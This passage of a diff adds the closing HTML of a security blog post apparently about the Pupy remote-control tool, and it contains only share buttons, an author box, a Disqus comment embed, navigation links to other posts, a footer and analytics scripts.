+                    <path d="M25.424 15.887v8.447h-4.896v-7.882c0-1.98-.71-3.33-2.48-3.33-1.354 0-2.158.91-2.514 1.802-.13.315-.162.753-.162 1.194v8.216h-4.9s.067-13.35 0-14.73h4.9v2.087c-.01.017-.023.033-.033.05h.032v-.05c.65-1.002 1.812-2.435 4.414-2.435 3.222 0 5.638 2.106 5.638 6.632zM5.348 2.5c-1.676 0-2.772 1.093-2.772 2.54 0 1.42 1.066 2.538 2.717 2.546h.032c1.71 0 2.77-1.132 2.77-2.546C8.056 3.593 7.02 2.5 5.344 2.5h.005zm-2.48 21.834h4.896V9.604H2.867v14.73z"></path>
+                </svg>
+            </span>
+            <span class="rrssb-text">linkedin</span>
+        </a>
+    </li>
+    <li class="rrssb-googleplus">
+        <a href="https://plus.google.com/share?url=/pupy-first-touch-101.html" class="popup">
+            <span class="rrssb-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24">
+                    <path d="M21 8.29h-1.95v2.6h-2.6v1.82h2.6v2.6H21v-2.6h2.6v-1.885H21V8.29zM7.614 10.306v2.925h3.9c-.26 1.69-1.755 2.925-3.9 2.925-2.34 0-4.29-2.016-4.29-4.354s1.885-4.353 4.29-4.353c1.104 0 2.014.326 2.794 1.105l2.08-2.08c-1.3-1.17-2.924-1.883-4.874-1.883C3.65 4.586.4 7.835.4 11.8s3.25 7.212 7.214 7.212c4.224 0 6.953-2.988 6.953-7.082 0-.52-.065-1.104-.13-1.624H7.614z"></path>
+                </svg>
+            </span>
+            <span class="rrssb-text">google+</span></a>
+    </li>
+    <li class="rrssb-pinterest">
+        <a href="http://pinterest.com/pin/create/button/?url=/pupy-first-touch-101.html&amp;description=Python远控Pupy使用帮助"><span class="rrssb-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewbox="0 0 28 28">
+                <path d="M14.02 1.57c-7.06 0-12.784 5.723-12.784 12.785S6.96 27.14 14.02 27.14c7.062 0 12.786-5.725 12.786-12.785 0-7.06-5.724-12.785-12.785-12.785zm1.24 17.085c-1.16-.09-1.648-.666-2.558-1.22-.5 2.627-1.113 5.146-2.925 6.46-.56-3.972.822-6.952 1.462-10.117-1.094-1.84.13-5.545 2.437-4.632 2.837 1.123-2.458 6.842 1.1 7.557 3.71.744 5.226-6.44 2.924-8.775-3.324-3.374-9.677-.077-8.896 4.754.19 1.178 1.408 1.538.49 3.168-2.13-.472-2.764-2.15-2.683-4.388.132-3.662 3.292-6.227 6.46-6.582 4.008-.448 7.772 1.474 8.29 5.24.58 4.254-1.815 8.864-6.1 8.532v.003z"></path>
+            </svg></span><span class="rrssb-text">pinterest</span></a>
+    </li>
+</ul>
+
+</div>
+
+
+    <div class="container">
+    <hr />
+    
+        
+            
+        
+        
+            <div id="img-about">
+                <img class="about-img pull-left" src="images/lubang.jpg">
+            </div>
+        
+        <div class="about-stub">
+            
+                
+            
+            <a class="different-highlight" href="about">
+                <h2 style="font-family: Montserrat">
+                    
+                        Larryxi
+                    
+                </h2>
+            </a>
+            
+                <p id="about-description" style="margin-top: 4px;">
+                    Jordon says,"JUST DO IT", so I learn IT.
+
+                </p>
+            
+        </div>
+    
+</div>
+<div style="clear:both"></div>
+
+
+
+
+
+
+    <aside id="comments" class="disqus">
+    	<div class="container">
+    		<h3 class="alignable pull-left"></h3> <h3 class="alignable pull-right"> <i class="icon-disqus"></i></h3>
+    		<!--
+    	  		Copy the universal code from Disqus. In particular, the div with id #disqus_thread and the following Javascript
+    			As an Example see below.
+    			Start here
+    	   	-->
+            <div id="disqus_thread"></div>
+                <script>
+                    /**
+                     *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+                     *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
+                     */
+                    /*
+                    var disqus_config = function () {
+                        this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+                        this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+                    };
+                    */
+                    (function() {  // DON'T EDIT BELOW THIS LINE
+                        var d = document, s = d.createElement('script');
+                        
+                        s.src = '//larryxi.disqus.com/embed.js';
+                        
+                        s.setAttribute('data-timestamp', +new Date());
+                        (d.head || d.body).appendChild(s);
+                    })();
+                </script>
+                <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+    		<!--
+    	  		End here
+    	  	-->
+    </aside>
+
+
+
+        </div>
+    </div>
+    <footer>
+    
+
+    
+    <div class="container page-suggestion">
+        
+            <a class="button alignable pull-left" href="/tftp-reflection-and-amplification-attack.html">
+                &larr; TFTP反射放大攻击浅析
+            </a>
+        
+        
+            <a class="button alignable pull-right" href="/DNS-zone-transfer-studying.html">
+                DNS域传送漏洞学习总结 &rarr;
+            </a>
+        
+    </div>
+    <div style="clear:both"></div>
+
+
+    
+    <hr />
+    <div class="user-footer">
+        <!--more<div class="copyright alignable pull-left">
+            
+                <h2> &copy;accent</h2>
+            
+        </div>-->
+        <div class="alignable pull-left">
+            <p class="faded"><!-- class="alignable pull-left" style="display: inline-block">-->
+            Built with <a href="http://jekyllrb.com/" class="different-highlight underline">Jekyll</a> and <a href="http://ankitsultana.me/accent/" class="different-highlight underline">accent</a>
+            </p>
+        </div>
+        <div class="alignable pull-right">
+            <a target="_blank" href="http://weibo.com/u/3996118191" class="button">
+                @Larryxi
+            </a>
+            <a href="mailto:larrycompress@gmail.com" class="button">
+                mail
+            </a>
+            <a target="_blank" href="/feed.xml" class="button">
+                rss
+            </a>
+        </div>
+    </div>
+    <!--<div style="clear:both"></div>
+    <hr />
+    <div class="theme-footer">
+        <p class="alignable pull-left" style="display: inline-block">
+            Built with <a href="http://jekyllrb.com/" class="different-highlight underline">Jekyll</a> and <a href="http://ankitsultana.me/accent/" class="different-highlight underline">accent</a>
+        </p>
+    </div>-->
+</footer>
+
+    <script src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
+    <script src="/js/rrssb.min.js"></script>
+
+    
+        <script src="js/anchor.min.js"></script>
+        <script>
+        anchors.options.placement = 'right'
+        anchors.options.class = 'hide'
+        anchors.add()
+        anchors.remove('.post-title')
+        </script>
+    
+    
+        <script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-69243698-7', 'auto');
+  ga('send', 'pageview');
+
+</script>
+
+    
+</body>
